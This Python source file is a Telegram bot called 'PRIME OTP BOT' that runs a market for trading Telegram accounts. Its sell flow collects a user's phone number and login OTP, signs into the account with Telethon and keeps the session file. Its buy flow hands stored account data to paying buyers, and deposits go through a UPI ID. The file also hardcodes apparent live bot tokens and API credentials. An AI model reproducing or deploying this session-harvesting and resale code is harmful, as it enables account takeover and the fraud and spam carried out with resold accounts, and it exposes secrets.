import telebot
from telebot import types
from telethon import TelegramClient
import asyncio
import os
from flask import Flask
from threading import Thread

# --- WEB SERVER ---
app = Flask('')
@app.route('/')
def home(): return "BOT LIVE"
def run(): app.run(host='0.0.0.0', port=8080)
def keep_alive(): Thread(target=run).start()

# --- CONFIG ---
TOKEN = '8692935006:AAFGFN6aeecPubPdd821zq-CmQnZzMtySsw' 
API_ID = 35155488
API_HASH = '9ee6b40363f94481d48dea8a3a871728'
OWNER_ID = 7634311488 

# Force Join Channel IDs
CHANNELS = [-1003901746920, -1003897524032]

bot = telebot.TeleBot(TOKEN)

# --- DATABASE ---
db = {
    'users': {}, 
    'admins': [OWNER_ID], 
    'upi': 'abhay-op.315@ptyes',
    'stock': {}, 
    'sell_rates': {}, 
    'buy_rates': {},
}
active_logins = {}

def is_admin(uid): return uid in db['admins'] or uid == OWNER_ID

# --- FORCE JOIN CHECK ---
def check_join(uid):
    for channel_id in CHANNELS:
        try:
            member = bot.get_chat_member(channel_id, uid)
            if member.status in ['left', 'kicked']:
                return False
        except:
            return False # Agar bot admin nahi hai channel mein toh check fail hoga
    return True

# --- KEYBOARDS ---
def main_menu():
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add('💰 BALANCE', '📥 DEPOSIT', '📤 SELL ID', '🛒 BUY ID', '📞 SUPPORT')
    return markup

# --- START & FORCE JOIN ---
@bot.message_handler(commands=['start'])
def start(message):
    uid = message.from_user.id
    if uid not in db['users']:
        db['users'][uid] = {'balance': 0}
    
    if not check_join(uid):
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📢 JOIN CHANNEL 1", url="https://t.me/PRIME_OTP_SUPPORT_GROUP"))
        markup.add(types.InlineKeyboardButton("📢 JOIN CHANNEL 2", url="https://t.me/god_abhay")) # Replace with actual links if needed
        markup.add(types.InlineKeyboardButton("✅ I HAVE JOINED", callback_data="check_joined"))
        return bot.send_message(message.chat.id, "❌ **ACCESS DENIED!**\n\nPlease join our channels first to use this bot.", reply_markup=markup)
    
    bot.send_message(message.chat.id, "🔥 **PRIME OTP BOT READY**", reply_markup=main_menu())

@bot.callback_query_handler(func=lambda call: call.data == "check_joined")
def check_callback(call):
    if check_join(call.from_user.id):
        bot.delete_message(call.message.chat.id, call.message.message_id)
        bot.send_message(call.message.chat.id, "✅ **THANKS FOR JOINING!**", reply_markup=main_menu())
    else:
        bot.answer_callback_query(call.id, "❌ Join all channels first!", show_alert=True)

# --- ADMIN PANEL ---
@bot.message_handler(commands=['admin'])
def admin_p(message):
    if not is_admin(message.from_user.id): return
    text = (
        "👑 **ADMIN PANEL**\n\n"
        "📈 `/setbuy INDIA 40`\n"
        "📉 `/setsell INDIA 25`\n"
        "➕ `/addstock INDIA data`\n"
        "❌ `/removestock INDIA`\n"
        "📜 `/list` - View All\n"
        "📢 `/broadcast MSG`"
    )
    bot.send_message(message.chat.id, text)

@bot.message_handler(commands=['setbuy'])
def set_b(message):
    if is_admin(message.from_user.id):
        try:
            _, c, p = message.text.split()
            db['buy_rates'][c.upper()] = int(p)
            bot.reply_to(message, f"✅ Buy price for {c.upper()} set.")
        except: pass

@bot.message_handler(commands=['setsell'])
def set_s(message):
    if is_admin(message.from_user.id):
        try:
            _, c, p = message.text.split()
            db['sell_rates'][c.upper()] = int(p)
            bot.reply_to(message, f"✅ Sell price for {c.upper()} set.")
        except: pass

# --- SELL SYSTEM ---
@bot.message_handler(func=lambda m: 'SELL ID' in m.text)
def sell_init(message):
    if not check_join(message.from_user.id): return
    if not db['sell_rates']: return bot.send_message(message.chat.id, "Disabled.")
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    for c in db['sell_rates']: markup.add(f"SELL {c}")
    markup.add("BACK")
    bot.send_message(message.chat.id, "Choose country:", reply_markup=markup)

@bot.message_handler(func=lambda m: m.text.startswith('SELL '))
def sell_p(message):
    country = message.text.split()[1]
    msg = bot.send_message(message.chat.id, f"Enter {country} number:", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, sell_otp, country)

def sell_otp(message, country):
    phone = message.text.strip()
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    client = TelegramClient(f"sessions/{phone}", API_ID, API_HASH, loop=loop)
    active_logins[message.chat.id] = {'client': client, 'phone': phone, 'loop': loop, 'country': country}
    try:
        loop.run_until_complete(client.connect())
        req = loop.run_until_complete(client.send_code_request(phone))
        active_logins[message.chat.id]['hash'] = req.phone_code_hash
        msg = bot.send_message(message.chat.id, "Enter OTP:")
        bot.register_next_step_handler(msg, sell_verify)
    except: bot.send_message(message.chat.id, "Error.")

def sell_verify(message):
    otp = message.text.strip()
    d = active_logins.get(message.chat.id)
    try:
        d['loop'].run_until_complete(d['client'].sign_in(d['phone'], otp, phone_code_hash=d['hash']))
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("APPROVE", callback_data=f"sa_{message.from_user.id}_{d['country']}"))
        for a in db['admins']:
            bot.send_message(a, f"Sell Req: {d['country']} from {message.from_user.id}", reply_markup=markup)
        bot.send_message(message.chat.id, "Verified! Wait for admin.")
    except: bot.send_message(message.chat.id, "Failed.")

# --- BUY SYSTEM ---
@bot.message_handler(func=lambda m: 'BUY ID' in m.text)
def buy_m(message):
    if not check_join(message.from_user.id): return
    if not db['buy_rates']: return bot.send_message(message.chat.id, "No stock.")
    markup = types.InlineKeyboardMarkup()
    for c, p in db['buy_rates'].items():
        count = len(db['stock'].get(c, []))
        markup.add(types.InlineKeyboardButton(f"{c} - ₹{p} ({count} left)", callback_data=f"buy_{c}"))
    bot.send_message(message.chat.id, "Select Country:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('buy_'))
def buy_f(call):
    c = call.data.split('_')[1]
    uid = call.from_user.id
    price = db['buy_rates'].get(c, 9999)
    if db['users'].get(uid, {}).get('balance', 0) < price or not db['stock'].get(c):
        return bot.answer_callback_query(call.id, "Error.", show_alert=True)
    data = db['stock'][c].pop(0)
    db['users'][uid]['balance'] -= price
    bot.send_message(uid, f"✅ **Bought!**\n\n`{data}`")

# --- DEPOSIT ---
@bot.message_handler(func=lambda m: 'DEPOSIT' in m.text)
def dep_start(message):
    if not check_join(message.from_user.id): return
    msg = bot.send_message(message.chat.id, "Enter Amount:")
    bot.register_next_step_handler(msg, dep_utr)

def dep_utr(message):
    try:
        amt = int(message.text)
        bot.send_message(message.chat.id, f"Pay: `{db['upi']}`\nSend 12-digit UTR:")
        bot.register_next_step_handler(message, dep_final_req, amt)
    except: pass

def dep_final_req(message, amt):
    utr = message.text.strip()
    if len(utr) != 12: return bot.send_message(message.chat.id, "12 digits required.")
    bot.send_message(message.chat.id, "Send Screenshot:")
    bot.register_next_step_handler(message, dep_final, amt, utr)

def dep_final(message, amt, utr):
    if message.content_type != 'photo': return
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("APPROVE", callback_data=f"da_{message.from_user.id}_{amt}"))
    for a in db['admins']:
        bot.send_photo(a, message.photo[-1].file_id, caption=f"Dep Req: ₹{amt}\nUTR: {utr}", reply_markup=markup)

# --- CALLBACKS ---
@bot.callback_query_handler(func=lambda call: True)
def handles(call):
    p = call.data.split('_')
    if p[0] == 'da':
        uid, amt = int(p[1]), int(p[2])
        db['users'][uid]['balance'] += amt
        bot.send_message(uid, f"Added ₹{amt}")
        bot.edit_message_caption("Approved ✅", call.message.chat.id, call.message.message_id)
    elif p[0] == 'sa':
        uid, country = int(p[1]), p[2]
        rate = db['sell_rates'].get(country, 0)
        db['users'][uid]['balance'] += rate
        bot.send_message(uid, f"ID Sold! ₹{rate} added.")
        bot.edit_message_text("Paid ✅", call.message.chat.id, call.message.message_id)

# --- BALANCE & SUPPORT ---
@bot.message_handler(func=lambda m: 'BALANCE' in m.text)
def check_bal(message):
    if not check_join(message.from_user.id): return
    b = db['users'].get(message.from_user.id, {}).get('balance', 0)
    bot.send_message(message.chat.id, f"💳 Balance: ₹{b}")

@bot.message_handler(func=lambda m: 'SUPPORT' in m.text)
def sup(message):
    if not check_join(message.from_user.id): return
    markup = types.InlineKeyboardMarkup()
    # Support links updated
    markup.add(types.InlineKeyboardButton("👤 OWNER", url="https://t.me/god_abhay"),
               types.InlineKeyboardButton("💬 SUPPORT GROUP", url="https://t.me/PRIME_OTP_SUPPORT_GROUP"))
    bot.send_message(message.chat.id, "🚩 Contact Support:", reply_markup=markup)

if __name__ == "__main__":
    keep_alive()
    bot.polling(none_stop=True)
